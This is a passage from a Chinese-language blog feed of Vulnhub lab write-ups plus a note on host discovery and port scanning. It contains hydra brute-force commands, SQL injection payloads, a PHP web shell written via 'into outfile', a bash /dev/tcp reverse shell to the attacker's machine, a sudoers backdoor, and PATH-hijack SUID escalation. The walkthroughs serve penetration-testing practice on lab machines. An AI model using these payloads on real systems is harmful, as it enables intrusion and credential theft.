试试。在搜索的时候，由于权限不足等原因，会有很多报错，因此将错误输出重定向到 <code>/dev/null</code>，以便清除这些不需要显示的错误信息：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name cronlog <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p> 结果显示 cronlog 在 &#x2F;var&#x2F;log 目录下，查看这个文件，发现系统会每两分钟运行一个名为 cleaner.py的文件：<br> <br><img src="/../images/Pasted%20image%2020250101203513.png"></p><p>搜索这个文件的位置：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name cleaner.py <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250101203943.png"></p><p>查看该文件的权限及属性：</p><p><img src="/../images/Pasted%20image%2020250101204022.png"></p><p>发现文件的所有者是 root，那就好办了 。</p><p>查看文件内容，每两分钟执行对目录&#x2F;tmp的删除操作：</p><p><img src="/../images/1735738558399.png"></p><p>在以前的靶场中我们都是执行反弹 shell，这次换个方法。编辑<code>/etc/sudoers</code> ，授予 overflow 用户无密码的 sudo 权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;overflow All=(All)NOPASSWD:ALL&quot;</span> &gt;&gt; /etc/sudoers<br></code></pre></td></tr></table></figure><p>最多两分钟后，运行<code>sudo /bin/bash</code>即可成功提权。</p><p><img src="/../images/Pasted%20image%2020250101210933.png"></p><h1 id="0x06-Conclusion"><a href="#0x06-Conclusion" class="headerlink" title="0x06 Conclusion"></a>0x06 Conclusion</h1><p>今天的收获是 binwalk, wireshark, hydra, find 命令及其输出过滤还有一种新的提权方法，总体来说不算难。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶场没有太多新知</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-Nullbyte</title>
    <link href="http://example.com/2024/12/30/Vulnhub-Nullbyte/"/>
    <id>http://example.com/2024/12/30/Vulnhub-Nullbyte/</id>
    <published>2024-12-30T05:04:45.000Z</published>
    <updated>2024-12-30T15:30:51.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场涉及的知识点很多，值得一练。</p><p><img src="/../images/Pasted%20image%2020241230232350.png"></p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.86.130</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230130836.png"></p><p>接下来对这个四个端口进行详细信息扫描:</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sC -sV -O -p80,<span class="hljs-number">111</span>,<span class="hljs-number">777</span>,<span class="hljs-number">47901</span> <span class="hljs-number">192.168.86.130</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230131200.png"></p><p>除了 80 端口和 777 端口的 ssh 服务之外，其它两个端口不知道是干什么的。按照惯例，先探索 80 端口。</p><h1 id="0x02-Web渗透"><a href="#0x02-Web渗透" class="headerlink" title="0x02 Web渗透"></a>0x02 Web渗透</h1><p>浏览器访问 <a href="http://192.168.86.130/">http://192.168.86.130</a> :</p><p><img src="/../images/Pasted%20image%2020241230132034.png"></p><p>查看源代码，这是一张名为 main.gif 的图片。这里学到一个思路，拿到图片之后，先看看是否存在图片隐写。</p><p>先把这张图片下载下来：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">wget http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.86.130/main.gif</span><br></code></pre></td></tr></table></figure><p>再用 <code>file</code> 命令确定文件类型，发现确实是个 .gif 文件。</p><p><img src="/../images/Pasted%20image%2020241230133334.png"></p><p>使用 <code>Exiftool</code> 查看该文件的元数据：</p><p><img src="/../images/Pasted%20image%2020241230134739.png"></p><p>发现一个奇怪的字符串，不知道是干什么的。</p><p>没什么思路就先目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> gobuster dir -u http://<span class="hljs-number">192.168.86.130</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230135357.png"></p><p>依次查看，只有<code>/phpmyadmin</code>可以访问，这是个数据库管理工具：</p><p><img src="/../images/Pasted%20image%2020241230135651.png"></p><p>到这就束手无策了，目前一点有用信息都没有。学习红队笔记思路，<code>kzMb5nVYJw</code>这个字符串除了可能是密码，还可能是一个 web 路径。</p><p>访问 <a href="http://192.168.86.130/kzMb5nVYJw">http://192.168.86.130/kzMb5nVYJw</a> :</p><p><img src="/../images/Pasted%20image%2020241230140448.png"></p><p>只有一个简单的输入框。查看源代码：</p><p><img src="/../images/Pasted%20image%2020241230140543.png"></p><p>提交方式是 POST，数据将被发送到 index.php 文件进行处理，输入框类型是 password。注释告诉我们这个表单不连接到 mysql 数据库，密码并不复杂。</p><h1 id="0x03-密码爆破"><a href="#0x03-密码爆破" class="headerlink" title="0x03 密码爆破"></a>0x03 密码爆破</h1><p>那就试试弱口令？尝试了一些简单密码，都失败了。那么就要尝试爆破了。</p><p>使用 BurpSuite 的 Intruder 模块成功爆破出密码：</p><p><img src="/../images/Pasted%20image%2020241230143030.png"></p><p>不过大佬建议尽量少用图形化工具，那么就用 kali 自带的 <code>hydra</code> 再爆破一次，多使用几次加深印象。</p><p><a href="https://www.cnblogs.com/shenkong/p/17410881.html">密码暴力破解工具——九头蛇（hydra）使用详解及实战 - 深空89 - 博客园</a></p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">hydra <span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span> http-form-post <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l xxshh -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><span class="hljs-comment"># ^PASS^:爆破值</span><br><span class="hljs-comment"># invalid key：这是表单返回的错误提示字符串。根据该字符串判断当前尝试是否失败。</span><br><span class="hljs-comment"># -l:指定用户名，但在这里无意义，随便写一个就行</span><br><span class="hljs-comment"># -P：指定爆破脚本</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230154615.png"></p><p>输入 elite，进入下一个页面：</p><p><img src="/../images/Pasted%20image%2020241230145403.png"></p><p>查看源代码：</p><p><img src="/../images/Pasted%20image%2020241230145643.png"></p><p>数据将被发送到 420search.php 文件进行处理，提交方式是 GET，除此之外没什么有用信息了。</p><p>既然是要搜索用户名，那一定和数据库有关系，会不会存在 sql 注入？</p><h1 id="0x04-SQL-注入"><a href="#0x04-SQL-注入" class="headerlink" title="0x04 SQL 注入"></a>0x04 SQL 注入</h1><p>首先尝试构造闭合，看会不会报错：</p><p><img src="/../images/Pasted%20image%2020241230151423.png"></p><p><img src="/../images/Pasted%20image%2020241230151642.png"></p><p>由此判断闭合方式是双引号。</p><p>构造个万能密码：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; or 1=1 -- -</span><br></code></pre></td></tr></table></figure><p>这里注意注释的方式。以前我习惯用 <code>#</code> 注释，但这仅适用于 MySQL。而<code>--</code>适用于大多数数据库。因为要求<code>--</code>后必须有个空格，所以使用<code>-- -</code>这种格式方便观察加没加空格。</p><p><img src="/../images/Pasted%20image%2020241230154742.png"></p><p>由此判断此处确实存在 sql 注入漏洞。接下来介绍四种 sql 注入方式、</p><ol><li><strong>手工注入</strong></li></ol><p>首先确定字段数，<code>order by 3 -- -</code> 不报错，<code>order by 4 -- -</code> 报错，说明有 3 个字段。</p><p><img src="/../images/Pasted%20image%2020241230155834.png"></p><p>接下来使用联合查询爆数据库名，数据库版本和当前登录用户：</p><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">-<span class="hljs-number">1</span>&quot; union <span class="hljs-selector-tag">select</span> <span class="hljs-built_in">database</span>(),<span class="hljs-built_in">version</span>(),<span class="hljs-built_in">user</span>() -- -<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230160505.png"></p><p>当前数据库名是 seth，版本高于5.1（存在 information_schema 这个表），当前用户是 root。</p><p>获取表名:</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&quot;seth&quot;</span> -- -<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230161550.png"></p><p>只有一张名为 users 的表。</p><p>获取列名:</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&quot;seth&quot;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&quot;users&quot;</span> -- -<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230162112.png"></p><p>获取用户名及密码：</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">user</span>, pass <span class="hljs-keyword">from</span> users -- -<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230162851.png"></p><p>这组密码 hash-identifier 没识别出来，那么根据经验猜测这是 base64 密码，解密：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230163526.png"></p><p>这串字符再用 hash-identifier 识别一下：</p><p><img src="/../images/Pasted%20image%2020241230163622.png"></p><p>解密 MD5:</p><p><img src="/../images/Pasted%20image%2020241230163732.png"></p><p>至此，得到了一组用户信息，用户名是 ramses，密码是 omega。第一种方法展示完毕。</p><ol start="2"><li><strong>写入一句话木马</strong></li></ol><p>已知后端语言是 php，一句话木马如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;shell&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>已知 Web 服务器是 Apache:</p><p><img src="/../images/Pasted%20image%2020241230170623.png"></p><p>那么网站根目录就是 <code>/var/www/html</code>，目录爆破爆破的时候扫出了上传文件夹名称是 <code>uploads</code>，这个文件夹是一定有写入权限的。接下来就可以写入一句话木马了：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot; union select &quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot; into outfile &quot;</span>/<span class="hljs-keyword">var</span>/www/html/uploads/sh.php<span class="hljs-string">&quot;; -- -</span><br><span class="hljs-string"># 注意引号嵌套问题</span><br></code></pre></td></tr></table></figure><p>实战中如果写入不成功的话，那么就是数据库 <code>secure_file_priv</code> 参数设置的问题。如果这个参数为空，那么这个变量没有效果；如果这个参数设为一个目录名，那么 MySQL 服务只允许在这个目录中执行文件的导入和导出操作。如果这个参数为NULL，MySQL服务会禁止导入和导出操作。</p><p>通过 shell 参数执行 ls 命令试试：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span>/uploads/<span class="hljs-keyword">sh</span>.php?<span class="hljs-keyword">shell</span>=<span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><p>后门上传成功：</p><p><img src="/../images/Pasted%20image%2020241230201133.png"></p><p>秉承着少用图形化工具的原则，还是用命令行操作。查看 <code>/kzMb5nVYJw/420search.php</code>文件：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span><span class="hljs-regexp">/uploads/</span>shell.php?shell=cat%<span class="hljs-number">20</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>kzMb5nVYJw/<span class="hljs-number">420</span>search.php<br><span class="hljs-comment"># 注意空格用 url 编码 %20</span><br></code></pre></td></tr></table></figure><p>得到了数据库的用户名及密码:</p><p><img src="/../images/Pasted%20image%2020241230182156.png"></p><p>现在就可以登录 phpmyadmin 了，获取用户名密码：</p><p><img src="/../images/Pasted%20image%2020241230182941.png"></p><ol start="3"><li><strong>写入反弹 shell</strong></li></ol><p>既然可以写入一句话木马，那么也可以写入反弹 shell 语句:</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.86.128/888 0&gt;&amp;1&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//bash -c 启动一个 Bash 进程</span><br></code></pre></td></tr></table></figure><p>同样写入 uploads 目录，这次文件名指定为 reverse.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot; union select &quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(\<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;%26 /dev/tcp/192.168.86.128/888 0&gt;%261&#x27;\&quot;); ?&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span> into outfile <span class="hljs-string">&quot;/var/www/html/uploads/reverse.php&quot;</span>; -- -<br># 注意转义<br># 优先使用双引号包裹外层字符串<br># 这里 &amp; 需要 url 编码<br></code></pre></td></tr></table></figure><p>这里卡了挺长时间，最后还是求助了，知道原来是<code>&amp;</code>被转义了。以后再遇到这种复杂命令，最好用 base64 编码后写入：</p><figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-string">&quot; union select &quot;</span>&lt;?base64_decode(cGhwIGV4ZWMoYmFzZTY0X2RlY29kZSgnWldOb2J5QW5TR1ZzYkc4Z2QyOXliR1FuT3c9PScpKQo=);?&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot; into outfile &quot;</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>ploads/<span class="hljs-keyword">reverse</span>.php<span class="hljs-string">&quot; -- -</span><br></code></pre></td></tr></table></figure><p>本机开放 888 监听端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>访问 <a href="http://192.168.86.130/uploads/reverse.php">http://192.168.86.130/uploads/reverse.php</a> ，即可触发反弹 shell:</p><p><img src="/../images/Pasted%20image%2020241230212222.png"></p><p>查看 420search.php 即可找到数据库用户名及密码。</p><ol start="4"><li><strong>SQLmap</strong></li></ol><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">sudo sqlmap -u <span class="hljs-symbol">&#x27;http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span>/kzMb5nVYJw/<span class="hljs-number">420</span>search.php?usrtosearch=&#x27; <span class="hljs-comment">--dump</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230201824.png"></p><h1 id="0x05-ssh登录及SUID提权"><a href="#0x05-ssh登录及SUID提权" class="headerlink" title="0x05 ssh登录及SUID提权"></a>0x05 ssh登录及SUID提权</h1><p>用户名是 ramses，密码是 omega，接下来就可以 ssh 登录了。</p><p>注意靶机的 ssh 服务不是在默认的 22 端口，而是 777 端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> ramses@<span class="hljs-number">192.168.86.130</span> -p <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure><p>接下来就是查看该用户的权限。</p><p>查看 sudo 权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230202512.png"></p><p>没有 sudo 权限，定时任务也没有操作空间。</p><p>这里又学到一个思路，输入 <code>history</code> 查看历史记录。</p><p>发现一个陌生的命令：</p><p><img src="/../images/Pasted%20image%2020241230205650.png"></p><p>这个命令是在 <code>/var/www/backup/</code> 目录下，进入该目录，<code>ls-l</code> 查看文件权限：<br><img src="/../images/Pasted%20image%2020241230210122.png"></p><p>发现 procwatch 的权限有 s 位，也就是有 SUID 权限。</p><p>接下来的思路就类似于之前做过的 HTB-Oopsie 了。</p><p>执行 procwatch ：</p><p><img src="/../images/Pasted%20image%2020241230212818.png"></p><p>发现他执行了 <code>sh</code> 和 <code>ps</code> 命令。</p><p>我们可以构造其中任意一个命令，添加到环境变量中。</p><p>以 <code>ps</code> 为例，在当前的 backup 文件夹创建一个 <code>ps</code> 文件，内容是 <code>/bin/bash</code>:</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure><p>给 <code>ps</code> 添加可执行权限：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> ps<br></code></pre></td></tr></table></figure><p>并将<code>/backup</code>添加到环境变量：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/var/www/backup:$PATH<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241230214115.png"></p><p>Shell 会按照 <strong><code>PATH</code></strong> 中的路径顺序，依次在这些目录中搜索名为 <code>ps</code> 的可执行文件。找到后立即执行，不再继续查找。</p><p>再次执行 procwatch，逻辑是没错的，但是提权失败了：</p><p><img src="/../images/613fe811-013b-48ed-bc82-c468628ad903.png"></p><p>还是经过求助，发现换成 <code>sh</code> 就可以了：</p><p><img src="/../images/Pasted%20image%2020241230224733.png"></p><p>除了创建文件之外，还有一种稍微简单的方法，建立软连接：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ln</span> -s /bin/<span class="hljs-keyword">sh</span> <span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure><p>然后再添加环境变量，也是一样的。</p><p>切换到 root 身份后，发现 sh 和 bash 权限是一样的。</p><p><img src="/../images/0ae762e81e34cfa0dc8ad00ab845597d.png"></p><p>大佬说是bash被限制了。执行 <code>bash</code> 后权限降低了：</p><p><img src="/../images/7ad900362ff409ef80e97edb8908e5dd.png"></p><h1 id="0x06-Conclusion"><a href="#0x06-Conclusion" class="headerlink" title="0x06 Conclusion"></a>0x06 Conclusion</h1><p>这个靶场属实是困住我太长时间了，过程中遇到很多问题，最后都是经过求助才解决的。虽然花了很长时间，不过以后再遇到类似情况，也知道如何排查问题了。过程中，操作更熟练了，理解得也更深了，就是要有越挫越勇的态度！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶场涉及的知识点</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>主机发现和端口扫描的原理及实现</title>
    <link href="http://example.com/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"/>
    <id>http://example.com/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/</id>
    <published>2024-12-29T08:02:32.000Z</published>
    <updated>2024-12-29T11:03:48.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>作为一个合格的渗透测试人员，是不能过度依赖工具的，因为很多环境下是不能使用这些红队工具的。比如拿到的是一台内网机器，没有 nmap 怎么办？被防火墙拦截了怎么办？使用工具被蓝队发现了怎么办？</p><p>所以我们要有能自己写脚本的能力，前提就是要了解该工具的原理。原理摸透之后，不仅能自己实现，使用相应工具也会更加游刃有余。</p><p>这篇博客主要介绍的是主机发现和端口扫描的原理及实现，应对无法使用 nmap 的情况。</p><h1 id="0x01-主机发现-ping-命令"><a href="#0x01-主机发现-ping-命令" class="headerlink" title="0x01 主机发现- ping 命令"></a>0x01 主机发现- ping 命令</h1><p>首先来看看 ping 命令的参数：</p><p><img src="/../images/Pasted%20image%2020241229164415.png"></p><p>重点关注 <code>-c</code>和 <code>-W</code> 两个参数，如果不指定参数，主机会一直发送 ICMP 报文，直到手动停止。</p><p>接下来就是写一个 bash 脚本，对该网段中的 ip 进行遍历，依次 ping 每个ip，查看回显，从而进行主机探测。</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in &#123;<span class="hljs-number">1</span>..<span class="hljs-number">254</span>&#125;; do ping -c <span class="hljs-number">1</span> -W <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">86</span>.$i ; done<br></code></pre></td></tr></table></figure><p>但是要从 1 遍历到 254，数据量比较大。想停止的话，按 Ctrl + C 不好用。这就涉及到对控制台信号的理解。Ctrl + C 是发送 SIGINT 信号给运行中的程序以尝试中断它，但以上语句是一个循环嵌套多个命令的脚本，而不是单个进程。即使当前的 ping 命令被中断，for 循环会继续执行并启动下一个 ping 子进程。正确做法是按下 <code>Ctrl + Z</code> 暂停脚本运行（发送 SIGTSTP 信号），然后使用 <code>kill</code> 终止：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> <span class="hljs-variable">%1</span><br>// <span class="hljs-variable">%1</span>:最近的一条命令<br></code></pre></td></tr></table></figure><p>我们可以先 ping 自己主机 ip 附近的几个 ip，查看开放和未开放的主机数据特征，然后根据相应的特征筛选。</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in &#123;<span class="hljs-number">126</span>..<span class="hljs-number">130</span>&#125;; do ping -c <span class="hljs-number">1</span> -W <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">86</span>.$i ; done<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241229171951.png"></p><p>根据开放主机的回显，可以将<code>ttl</code>作为过滤的关键词，bash 脚本如下：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in &#123;<span class="hljs-number">1</span>..<span class="hljs-number">254</span>&#125;; do ping -c <span class="hljs-number">1</span> -W <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">86</span>.$i | grep ttl; done<br></code></pre></td></tr></table></figure><p>可以看到该网段存活的一些主机：</p><p><img src="/../images/Pasted%20image%2020241229175624.png"></p><h1 id="0x02-端口扫描-netcat"><a href="#0x02-端口扫描-netcat" class="headerlink" title="0x02 端口扫描- netcat"></a>0x02 端口扫描- netcat</h1><p>实现端口扫描需要旧版的 nc，而 kali 中默认安装的是新版 nc，因此要使用 nc.traditional，需要指定以下两个参数：</p><p><img src="/../images/Pasted%20image%2020241229175848.png"></p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>.traditional -vv -z <span class="hljs-number">192.168.86.130</span> <span class="hljs-number">1</span>-<span class="hljs-number">65535</span><br></code></pre></td></tr></table></figure><p>同样也需要对输出信息进过滤。首先指定一个区间看看有没有开放的端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>.traditional -vv -z <span class="hljs-number">192.168.86.130</span> <span class="hljs-number">20</span>-<span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>发现 111 是开放的：</p><p><img src="/../images/Pasted%20image%2020241229180712.png"></p><p>那么就可以用关键词 open 过滤，也可以筛选没有 refused 字眼的：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">nc.traditional <span class="hljs-punctuation">-</span>vv <span class="hljs-punctuation">-</span>z <span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span> <span class="hljs-number">1</span><span class="hljs-punctuation">-</span><span class="hljs-number">65535</span> <span class="hljs-string">| grep -v refused</span><br><span class="hljs-comment">// -v:反向匹配</span><br></code></pre></td></tr></table></figure><p>但是这样过滤是无效的：</p><p><img src="/../images/Pasted%20image%2020241229181150.png"></p><p>需要添加<code>2&gt;&amp;1</code>将标准错误输出（stderr）重定向到标准输出（stdout），才可以对整个输出进行过滤：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>.traditional -vv -z <span class="hljs-number">192.168.86.130</span> <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep -v refused<br></code></pre></td></tr></table></figure><p>这样就可以看到开放端口了：</p><p><img src="/../images/Pasted%20image%2020241229182246.png"></p><h1 id="0x03-端口扫描-伪设备"><a href="#0x03-端口扫描-伪设备" class="headerlink" title="0x03 端口扫描-伪设备"></a>0x03 端口扫描-伪设备</h1><p>很多经典的语句和方法都是基于 bash 的，使用 bash 会更加稳定。而 Kali Linux中默认的shell环境是zsh：</p><p><img src="/../images/Pasted%20image%2020241229182620.png"></p><p>我们需要输入 bash 字符调整为 bash 的 shell 环境。</p><p>bash 脚本如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..65535&#125;; <span class="hljs-keyword">do</span> (<span class="hljs-built_in">echo</span> &lt; /dev/tcp/192.168.86.130/<span class="hljs-variable">$i</span>) &amp;&gt;/dev/null &amp;&amp; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\n[+] The open port is : %d\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span> || <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;.&quot;</span>;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 脚本解读</p><ul><li>&#x2F;dev&#x2F;tcp 是一种虚拟设备文件，通过访问 &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port，可以直接与目标主机和端口建立 TCP 连接。</li><li>&lt; 是输入重定向符号，实际上只是触发连接尝试。</li><li>&amp;&gt;&#x2F;dev&#x2F;null 将标准输出和标准错误输出都丢弃，不会显示在屏幕上。</li><li>如果端口连接成功，打印出开放的端口号。</li><li>如果端口连接失败，执行 printf “.”。</li></ul></blockquote><h1 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h1><p>要想真正掌握一门技术，一定要多思考背后的原理。不仅如此，也要慢慢提升自己代码能力，不能单纯依赖工具，还是要会自己编写脚本。</p>]]></content>
    
    
      
      
